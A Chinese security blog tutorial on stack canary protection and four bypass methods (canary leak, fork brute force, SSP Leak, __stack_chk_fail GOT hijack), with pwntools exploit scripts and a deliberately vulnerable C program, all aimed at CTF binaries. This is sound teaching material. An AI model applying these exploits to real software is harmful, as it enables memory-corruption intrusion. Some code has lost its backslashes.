# Canary保护详解和常用Bypass手段

阅读量 **501433**

|评论 **7**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-05-09 16:30:32

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t013edb5d88ca576425.jpg)

## 简介

canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致

在32位程序上：

![](https://s2.ax1x.com/2019/05/07/EyZtOO.png)

在64位程序上：

![](https://s2.ax1x.com/2019/05/07/EyZdTH.png)

若一致则正常退出，如果是栈溢出或者其他原因导致canary的值发生变化，那么程序将执行___stack_chk_fail函数，继而终止程序

![](https://s2.ax1x.com/2019/05/07/EyZDfI.png)

可以看出，如果程序开启canary保护，并且不知道canary的值是多少，那么就不能够进行ROP来劫持程序流程

在GCC中开启canary保护：

    
    
    -fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护
    -fstack-protector-all 启用保护，为所有函数插入保护
    -fstack-protector-strong
    -fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护
    -fno-stack-protector 禁用保护.
    

下面详细讲一下绕过手法

## 一、泄露栈中的canary

canary设计是以“x00”结尾，本意就是为了保证canary可以截断字符串。泄露栈中canary的思路是覆盖canary的低字节，来打印出剩余的canary部分。

泄露条件：

  * 存在栈溢出漏洞
  * 可以将存在于栈上的可控变量进行输出

Example：

    
    
    #include <stdio.h>
    #include <unistd.h>
    #include <stdlib.h>
    #include <string.h>
    void getshell(void) {
        system("/bin/sh");
    }
    void init() {
        setbuf(stdin, NULL);
        setbuf(stdout, NULL);
        setbuf(stderr, NULL);
    }
    void vuln() {
        char ooo[100];
        for(int i=0;i<2;i++){
            read(0, ooo, 0x200);
            printf(ooo);
        }
    }
    int main(void) {
        init();
        puts("Hello radish!");
        vuln();
        return 0;
    }
    #gcc -m32 -fstack-protector-all filename.c -o filename
    

分析该程序，在vuln函数中存在栈溢出和格式化字符串漏洞

第一种思路就是利用读入的ooo变量，正好溢出到canary的位置，然后输出的时候，printf就可以把canary的值当做ooo变量的一部分进行输出

![](https://s2.ax1x.com/2019/05/07/EyZy1P.png)

第二次输入的时候，在payload中将canary的位置填充成刚刚泄露出来的值即可

exp：

    
    
    #coding:utf-8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
    r = process("./test")
    shell_addr = ELF("./test").sym["houmen"]
    r.recvuntil("Hello radish!n")
    payload = "a"*100
    r.sendline(payload)
    r.recvuntil("a"*100)
    canary = u32(r.recv(4))-0x0a
    log.info("canary:"+hex(canary))
    payload =  "a"*100 #填充
    payload += p32(canary)#泄露的canary
    payload += "a"*8
    payload += "aaaa" #ebp
    payload += p32(shell_addr) # ret addr
    r.sendline(payload)
    sleep(0.2)
    r.interactive()
    

第二种思路就是第一次输入的时候通过格式化字符串漏洞直接将栈上canary打印出来，然后再进行ROP

利用libformatstr求出偏移量和填充量

![](https://s2.ax1x.com/2019/05/07/EyZcX8.png)

计算出canary相对于参数的偏移量是（6+25）=31，然后进行ROP

exp：

    
    
    #coding:utf-8
    from pwn import *
    from libformatstr import *
    context.log_level = 'debug'
    context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
    r = process("./test")
    shell_addr = ELF("./test").sym["houmen"]
    r.recvuntil("Hello radish!n")
    debug = 0
    if debug:
        bufsiz = 50
        r.sendline(make_pattern(bufsiz))
        data = r.recv() 
        offset, padding = guess_argnum(data, bufsiz)
        log.info("offset : " + str(offset))
        log.info("padding: " + str(padding))
        exit()
    r.sendline("%31$p")
    canary = eval(r.recv())
    log.info("canary:"+hex(canary))
    payload =  "a"*100 #填充
    payload += p32(canary)#泄露的canary
    payload += "a"*8
    payload += "aaaa" #ebp
    payload += p32(shell_addr) # ret addr
    r.sendline(payload)
    sleep(0.2)
    r.interactive()
    

###  二、逐位爆破canary

在某些pwn题中存在fork函数，且程序开启了canary保护，当程序进入到子进程的时候，其canary的值和父进程中canary的值一样，在一定的条件下我们可以将canary爆破出来；需要必备的条件就是程序中存在栈溢出的漏洞，并且可以覆盖到canary的位置，那么我们就可以把canary一位一位的爆破出来

拿一道CTF题做例子，已知该程序开启了canary和NX保护

载入IDA中审计代码发现存在fork函数

![](https://s2.ax1x.com/2019/05/07/EyZR0g.png)

在sub_80487FA函数中存在栈溢出

![](https://s2.ax1x.com/2019/05/07/EyZvN9.png)

exp：（测试输出字符串）

    
    
    #coding:utf-8
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
    r = process("pwn2")
    file = ELF("./pwn2")
    libc = ELF("./libc.so.6")
    log.info("---------------------------条件准备-----------------------------------")
    print " puts_plt_addr:"+hex(file.plt['puts'])
    print " puts_got_addr:"+hex(file.got['puts'])
    r.recv()
    r.sendline("Y")
    r.recv()
    r.sendline("radish")
    r.recv()
    r.send("a"*16+"x00")
    log.info("---------------------------爆破canary-----------------------------------")
    str1 = r.recv()
    true_len = 46
    canary = "x00"
    for x in xrange(3):
        for y in xrange(256):
            r.sendline("Y")
            r.recv()
            r.sendline("radish")
            r.recv()
            r.send("a"*16+canary+chr(y))
    
            if "<unknown>" in r.recvuntil("[*] Do you love me?[Y]",drop=True):
                a=123
            else:
                canary = canary+chr(y)
                log.info('At round %d find canary byte %#x' %(x, y))
                r.recv()
                break
    log.info("爆破出canary的值为%#x"%(u32(canary)))
    
    log.info("---------------------------测试canary正确性-----------------------------------")
    r.sendline("Y")
    print r.recv()
    r.sendline("wxm")
    print r.recv()
    libc_so_6_str_addr = 0x0804833D
    payload = "a"*16+canary+"a"*12+p32(file.plt['puts'])+"aaaa"+p32(libc_so_6_str_addr)
    r.sendline(payload)
    r.recv()
    

成功输出：

![](https://s2.ax1x.com/2019/05/07/EyZxhR.png)

## 三、SSP Leak

全称是Stack Smashing Protect Leak
，这种方法没办法让我们getshell，但是我们可以利用这种方法获取到内存中的值，比如当flag在内存中储存时，我们就可以利用这个方法来读取flag

在函数结尾处检查canary时，若canary被改变，则程序在终止之前会执行__stack_chk_fail函数，如下所示：

![](https://s2.ax1x.com/2019/05/07/EyeCjK.png)

__stack_chk_fail()函数定义如下：

    
    
    eglibc-2.19/debug/stack_chk_fail.c
    
    void __attribute__ ((noreturn)) __stack_chk_fail (void)
    {
      __fortify_fail ("stack smashing detected");
    }
    
    void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
    {
      /* The loop is added only to keep gcc happy.  */
      while (1)
        __libc_message (2, "*** %s ***: %s terminatedn",
                        msg, __libc_argv[0] ?: "<unknown>");
    }
    

当程序中存在栈溢出，并且溢出的长度可以覆盖掉程序中argv[0]的时候，我们可以通过这种方法打印任意地址上的值，造成任意地址读。

更深一步的讲，对于linux，fs段寄存器实际指向的是当前栈的TLS结构，fs:0x28指向的正是stack_guard

    
    
    typedef struct
    {
      void *tcb;        /* Pointer to the TCB.  Not necessarily the
                           thread descriptor used by libpthread.  */
      dtv_t *dtv;
      void *self;       /* Pointer to the thread descriptor.  */
      int multiple_threads;
      uintptr_t sysinfo;
      uintptr_t stack_guard;
      ...
    } tcbhead_t;
    

如果存在溢出并且可以覆盖位于TLS中保存的canary值，那么就可以实现绕过保护机制

TLS中的值由函数security_init进行初始化

    
    
    static void
    security_init (void)
    {
      // _dl_random的值在进入这个函数的时候就已经由kernel写入.
      // glibc直接使用了_dl_random的值并没有给赋值
      // 如果不采用这种模式, glibc也可以自己产生随机数
    
      //将_dl_random的最后一个字节设置为0x0
      uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);
    
      // 设置Canary的值到TLS中
      THREAD_SET_STACK_GUARD (stack_chk_guard);
    
      _dl_random = NULL;
    }
    
    //THREAD_SET_STACK_GUARD宏用于设置TLS
    #define THREAD_SET_STACK_GUARD(value) 
      THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)
    

同样拿一道CTF题做例子（GUESS）来演示利用方式，该程序开启了canary和NX保护

![](https://s2.ax1x.com/2019/05/07/EyeugP.png)

程序先把flag读入到栈上，然后利用gets函数进行三次读入，这里可以进行三次栈溢出，然后利用SSP Leak将flag打印出来

首先找到argv[0]的地址，计算出偏移量，用gdb加载程序，在栈很高的地址上可以看到，它默认指向文件名

![](https://s2.ax1x.com/2019/05/07/Eye1Hg.png)

在gdb中调试出，我们输入的字符串s2在 “rbp-0x40”处，flag在”rbp-0x70处”，从而计算出能够覆盖掉argv[0]的偏移是0x128

根据第一次泄露出的puts函数的真实地址，计算出libc基地址

    
    
    payload = 'a'* 0x128 + p64(0x602020)*3
    

第二次泄露的_environ，也就是真实栈的地址

    
    
    environ_addr = libc_base + libc.symbols['_environ']
    

在linux应用程序运行时，内存的最高端是环境/参数节（environment/arguments
section），用来存储系统环境变量的一份复制文件，进程在运行时可能需要。

例如，运行中的进程，可以通过环境变量来访问路径、shell 名称、主机名等信息。  
该节是可写的，因此在格式串（format string）和缓冲区溢出（buffer overflow）攻击中都可以攻击该节。

*environ指针指向栈地址(环境变量位置)，有时它也成为攻击的对象，泄露栈地址，篡改栈空间地址，进而劫持控制流。环境表是一个表示环境字符串的字符指针数组，由”name=value”这样类似的字符串组成,它储存在整个进程空间的的顶部，其中value是一个以”″结束的C语言类型的字符串，代表指针该环境变量的值,一般我们见到的name都是大写，但这只是一个惯例

我们需要泄漏出栈的地址，才能泄漏出flag，而_environ存着栈的地址，所以我们需要泄漏_environ

第三次通过之前计算的偏移，直接泄露flag

完整exp：

    
    
    from pwn import *
    context.log_level = 'debug'
    context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
    
    p = process('./GUESS.')
    puts_got = 0x602020
    #leak libc
    p.recvuntil('guessing flagn')
    payload = 'a'*0x128 + p64(puts_got)
    p.sendline(payload)
    p.recvuntil('detected ***: ')
    puts_addr = u64(p.recv(6).ljust(8,'x00'))
    log.success('puts addr : 0x%x' %puts_addr)
    #gdb.attach(p)
    offset_puts = 0x6f690
    libc_base = puts_addr - offset_puts
    log.success('libc base addr : 0x%x' %libc_base)
    
    addr__environ = 0x3c6f38
    _environ_addr = libc_base + addr__environ
    log.success('_environ addr : 0x%x' %addr__environ)
    
    #leak environ
    p.recvuntil('guessing flagn')
    payload = 'a'*0x128 + p64(_environ_addr)
    p.sendline(payload)
    p.recvuntil('detected ***: ')
    stack_base = u64(p.recv(6).ljust(8,'x00')) - 0x198
    log.success('stack base addr : 0x%x' %stack_base)
    flag_addr = stack_base + 0x30
    
    #leak flag
    p.recvuntil('guessing flagn')
    payload = 'a'*0x128 + p64(flag_addr)
    p.sendline(payload)
    p.recvuntil('detected ***: ')
    p.recvuntil('}')
    p.interactive()
    

## 四、劫持__stack_chk_fail函数

在开启canary保护的程序中，如果canary不对，程序会转到 **stack_chk_fail函数执行，**
stack_chk_fail函数是一个普通的延迟绑定函数，可以通过修改GOT表劫持这个函数。利用方式就是通过格式化字符串漏洞来修改GOT表中的值。

还是直接用CTF题上手（babyfmt），程序开启了canary和NX保护

main函数中存在栈溢出和格式化字符串漏洞

![](https://s2.ax1x.com/2019/05/07/EyeGNj.png)

有一个hello函数，留了一个后门

![](https://s2.ax1x.com/2019/05/07/EyeJ4s.png)

由于栈溢出的长度不够我们覆盖掉返回地址，所以不能利用ROP来改变程序的流程，再一想，程序还存在格式化字符串漏洞，并且开启了canary保护，我们可以通过格式化字符串漏洞来篡改GOT表中__stack_chk_fail存储的地址，将它的地址修改成hello函数地址，然后通过栈溢出来覆盖canary，故意触发__stack_chk_fail函数的执行，相当于执行了hello函数，从而getshell

exp：

    
    
    #coding:utf-8
    from pwn import *
    from libformatstr import *
    context.log_level = 'debug'
    
    context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
    r = process("./babyfmt")
    file = ELF("./babyfmt")
    stack_chk_fail_got = file.got['__stack_chk_fail']
    log.info(hex(stack_chk_fail_got))#0x601018
    hello_addr = 0x400626
    # bufsiz = 50
    # r.sendline(make_pattern(bufsiz))             
    # data = r.recv() 
    # offset, padding = guess_argnum(data, bufsiz)
    log.info("offset : " + str(6))
    log.info("padding: " + str(0))
    
    p = FormatStr()
    p[stack_chk_fail_got] = hello_addr
    buf = p.payload(6,0)
    #gdb.attach(r)
    r.sendline(buf+"a"*(0x60-len(buf)))
    sleep(0.2)
    r.interactive()
    

## 个人感悟

以上总结的只是常见的利用手法，其实还有许多绕过canary保护的姿势！通过总结这篇文章，加深了我对二进制安全的理解，也希望能帮助到更多的人。

本文如有不妥之处，敬请斧正。

## 参考文献

[关于canary的总结](https://zhakul.top/archives/216)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **萝卜啊啊啊啊啊啊** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/177832](/post/id/177832)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)

 **+1** __21赞

 __收藏

![](https://p1.ssl.qhimg.com/t014aa7348eeeb820f6.png) 萝卜啊啊啊啊啊啊

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

